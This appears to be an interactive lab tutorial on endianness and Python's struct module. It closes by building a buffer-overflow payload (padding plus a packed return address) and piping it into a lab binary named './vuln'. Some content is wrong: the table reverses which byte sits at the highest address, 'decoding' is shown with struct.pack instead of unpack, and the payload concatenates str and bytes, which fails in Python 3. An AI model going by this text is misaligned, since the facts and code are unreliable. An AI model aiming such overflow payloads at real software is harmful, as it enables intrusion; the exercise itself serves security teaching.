# Endianess and struct python module

The [struct python module](https://docs.python.org/3/library/struct.html#format-characters) is a formidable library to convert python values into C-structs. One of the main usage for it, is to__ interpret bytes as packed binary data__:

## Little-Endian (LE) vs. Big-Endian (BE)

> In computing, endianness is the order or sequence of bytes of a word of digital data in computer memory. Endianness is primarily expressed as big-endian or little-endian. A big-endian system stores the most significant byte of a word at the smallest memory address and the least significant byte at the largest
> [Wikipedia](https://en.wikipedia.org/wiki/Endianness)

To illustrate, let's compare Arabic vs. English books: The first is written or read from right-to-left while the other is from left-to-right! Luckily, we don't have anything from top-to-bottom and the only alphabet we got are `0s` and `1s` ... what a relief!

Let's say that we want to write the number 134517454 (base10) in computer language. A computer only understand base2 (0s and 1s) but can easily represents bytes in base16 which will translates into 0x80492ce (base 16).

| Endiannes| representation | byte written at the highest memory address |
| --- | --- | --- |
| Little | \xce\x92\x04\x08 | least significant byte |
| Big | \x08\x04\x92\xce | most significant byte |

Most CPU chips, such as Intel (market leader) have adopted Little-Endian architecture.

## Using python struct module

Let's consider the memory address 0x2131415, How will you write it in Big-Endian? in Little-Endian?

You can use the struct module to verify your response:

type `python{{execute}} to open a python console

import the struct module: `import struct`{{execute}}

According to the [struct documentation](https://docs.python.org/3/library/struct.html#format-characters):
- `I` or `i` means 4 bytes long
- `<` means Little-Endian
- `>` means Big-Endian:

We can combine:
- `<I` represents a number in 4 bytes Little-Endian representation
- `>I` represents a number in 4 bytes Big-Endian representation

In your python console:
- Print the address in Big-Endian: `struct.pack('>I', 0x2131415)`{{execute}}
- Print the address in Little-Endian: `struct.pack('<I', 0x2131415)`{{execute}}

You can also do the opposite and obtain the decimal value from an address represented in Little ot Big-Endian:
- `struct.pack('<I', '\x15\x14\x13\x02')`{{execute}} for little endian to decimal memory address
- `struct.pack('>I', '\x02\x13\x14\x15')`{{execute}} for big endian to decimal memory address

Conversion from base10 to base16 is easy: `hex(34804757)`{{execute}}

Type `quit()`{{execute}} to exit the python console or press `<CTRL>D`

## Rewrite our previous exploit with the struct module

Let's consider the below code:

```python
import struct
offset 	= 2060
rip	= struct.pack('<I', 0x80492ee)
payload = 'A'*offset + rip
print(payload)
```{{copy}}

We can execute it in just one line of code: `python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80492ee);payload = 'A'*offset + rip;print(payload)"`{{execute}}

Does the exploit work? Which of the below command we need to type to make it work?

`echo $(python -c "import struct;offset=2060;rip=struct.pack('<I', 0x80492ee);payload = 'A'*offset + rip;print(payload)") | ./vuln`{{execute}}
